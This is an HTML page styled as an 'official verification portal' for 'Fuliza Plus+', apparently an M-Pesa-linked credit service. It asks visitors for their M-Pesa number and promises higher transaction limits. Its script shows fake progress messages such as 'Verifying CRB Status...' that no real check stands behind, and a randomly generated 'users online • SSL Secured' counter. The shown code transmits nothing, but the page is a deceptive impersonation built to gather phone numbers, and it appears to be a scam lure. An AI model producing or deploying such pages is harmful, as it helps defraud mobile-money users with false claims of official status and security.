<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fuliza Plus+</title>

<style>
body{
  margin:0;
  font-family:system-ui, sans-serif;
  background:#f3f5f7;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

/* CARD */
.card{
  width:90%;
  max-width:360px;
  background:#fff;
  padding:30px 20px;
  border-radius:25px;
  text-align:center;
  box-shadow:0 10px 30px rgba(0,0,0,0.08);
}

.hidden{display:none}

/* ICON */
.icon{
  width:90px;
  height:90px;
  border-radius:50%;
  background:#e6f4ea;
  display:flex;
  align-items:center;
  justify-content:center;
  margin:0 auto 15px;
  font-size:40px;
  color:#16a34a;
}

/* TEXT */
h2{
  margin:10px 0 5px;
}

.sub{
  color:#16a34a;
  font-size:13px;
  letter-spacing:1px;
}

.desc{
  font-size:14px;
  color:#666;
  margin:10px 0 20px;
}

/* INPUT */
input{
  width:100%;
  padding:15px;
  border-radius:12px;
  border:1px solid #ddd;
  font-size:16px;
  margin-top:10px;
}

/* BUTTON */
button{
  width:100%;
  padding:15px;
  border:none;
  border-radius:14px;
  margin-top:15px;
  font-size:16px;
  font-weight:bold;
  background:#16a34a;
  color:#fff;
}

/* LOADER */
.spinner{
  width:60px;
  height:60px;
  border:5px solid #e5e7eb;
  border-top:5px solid #16a34a;
  border-radius:50%;
  margin:0 auto 15px;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  100%{transform:rotate(360deg);}
}

.loading-text{
  font-size:18px;
  font-weight:600;
}

.loading-sub{
  font-size:14px;
  color:#777;
}

/* FOOTER */
.footer{
  font-size:12px;
  color:#888;
  margin-top:15px;
}
</style>
</head>

<body>

<!-- STEP 1 -->
<div class="card" id="step1">
  <div class="icon">👤</div>
  <h2>Fuliza Plus+</h2>
  <div class="sub">OFFICIAL VERIFICATION PORTAL</div>
  <div class="desc">
    Verify your identity to unlock higher daily transaction limits.
  </div>

  <input id="phone" placeholder="Enter M-Pesa Number">
  <button onclick="startProcess()">Check My Eligibility</button>

  <div class="footer" id="live">
    142 users online • SSL Secured
  </div>
</div>

<!-- STEP 2 -->
<div class="card hidden" id="step2">
  <div class="spinner"></div>
  <div class="loading-text" id="loadingText">Connecting...</div>
  <div class="loading-sub">Accessing secure databases...</div>
</div>

</body>

<script>
function startProcess(){
  let phone = document.getElementById("phone").value;
  if(!phone) return alert("Enter phone number");

  step1.classList.add("hidden");
  step2.classList.remove("hidden");

  // Change loading messages like your screenshot
  setTimeout(()=>{
    document.getElementById("loadingText").innerText =
      "Verifying CRB Status...";
  },2000);

  setTimeout(()=>{
    document.getElementById("loadingText").innerText =
      "Finalizing...";
  },4000);
}

// LIVE USERS
setInterval(()=>{
  let n = Math.floor(Math.random()*100)+120;
  document.getElementById("live").innerText =
    n + " users online • SSL Secured";
},2000);
</script>

</html>
